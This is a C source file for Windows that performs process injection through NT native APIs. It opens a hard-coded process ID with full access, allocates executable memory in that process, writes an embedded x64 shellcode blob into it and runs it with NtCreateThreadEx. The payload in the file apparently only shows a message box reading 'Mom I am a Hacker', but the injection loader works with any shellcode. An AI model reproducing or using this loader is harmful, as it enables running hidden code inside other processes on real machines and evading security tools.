#include <Windows.h>
#include <stdio.h>
#include "nativeH.h"

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
int main(void)
{
    HMODULE hDll = GetModuleHandleW(L"ntdll.dll");
    if (hDll == NULL)
    {
        error("Error to get Handle of NTDLL");
        return -1;
    }
    okay("Sucess the handle is [0x%p]", hDll);

    info("Loading functions...");
    NtOpenProcess ntOpenProcess = (NtOpenProcess)GetProcAddress(hDll, "NtOpenProcess");
    NtAllocateVirtualMemory ntAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory ntWrite = (NtWriteVirtualMemory)GetProcAddress(hDll, "NtWriteVirtualMemory");
    NtCreateThreadEx ntCreateThread = (NtCreateThreadEx)GetProcAddress(hDll, "NtCreateThreadEx");
    NtClose ntClose = (NtClose)GetProcAddress(hDll, "NtClose");
    okay("Loaded all Fuctions");

    unsigned char shellCode[] = {
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48"
        "\x8b\x52\x18\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x48"
        "\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
        "\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01"
        "\xd0\x8b\x48\x18\x50\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41"
        "\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x12"
        "\x00\x00\x00\x4d\x6f\x6d\x20\x49\x20\x61\x6d\x20\x61\x20"
        "\x48\x61\x63\x6b\x65\x72\x00\x5a\xe8\x12\x00\x00\x00\x4d"
        "\x6f\x6d\x20\x49\x20\x61\x6d\x20\x61\x20\x48\x61\x63\x6b"
        "\x65\x72\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56\x07"
        "\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5"};

    size_t RegionSize = sizeof(shellCode);
    NTSTATUS status = 0;
    HANDLE hProcess;
    OBJECT_ATTRIBUTES oa = {sizeof(oa), NULL};
    CLIENT_ID clid = {(HANDLE)13908, NULL};
    PVOID buffer = NULL;

    status = ntOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &clid);
    if(STATUS_SUCCESS != status)
    {
        error("ntOpenProcess: 0x%X", status);
        return 1;
    }
    okay("Sucess to Open process: ", hProcess);

    status = ntAlloc(hProcess, &buffer, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (STATUS_SUCCESS != status)
    {
        error("NtAlloc: 0x%X", status);
        return 1;
    }
    okay("Sucess to Alloc memory ");

    size_t bytesWritten;

    status = ntWrite(hProcess, buffer, shellCode, sizeof(shellCode), &bytesWritten);
    if (STATUS_SUCCESS != status)
    {
        error("ntWrite: 0x%X", status);
        return 1;
    }
    okay("Sucess to Write in memory ");

    HANDLE hThread = NULL;

    status = ntCreateThread(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, 0);
    if (STATUS_SUCCESS != status)
    {
        error("ntCreateThread: 0x%X", status);
        return 1;
    }
    okay("Sucess to create Thread ");

    info("Closing All Handles...");
    ntClose(hProcess);
    ntClose(hThread);
    ntClose(hDll);
    okay("Program Exiting");

    return 0;
}